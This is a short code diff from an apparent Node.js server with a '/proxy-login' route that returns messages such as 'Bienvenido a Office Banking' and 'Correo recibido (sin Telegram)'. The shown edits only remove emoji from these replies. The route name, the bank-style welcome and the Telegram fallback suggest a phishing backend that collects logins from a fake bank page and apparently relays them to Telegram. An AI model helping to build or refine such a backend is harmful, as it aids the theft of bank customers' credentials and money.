@@ -191,7 +191,7 @@ app.post("/proxy-login", async (req, res) => {
       
       return res.json({ 
         status: "ok", 
-        mensaje: resultado ? "✅ Correo actualizado correctamente" : "✅ Correo recibido (sin Telegram)" 
+        mensaje: resultado ? "Correo actualizado correctamente" : "✅ Correo recibido (sin Telegram)" 
       });
     }
 
@@ -209,7 +209,7 @@ Hora: ${new Date().toLocaleString('es-CL')}`;
       console.log(`\n✅ Respondiendo al cliente...`);
       return res.json({ 
         status: "ok", 
-        mensaje: "✅ Bienvenido a Office Banking" 
+        mensaje: "Bienvenido a Office Banking" 
       });
     }
 
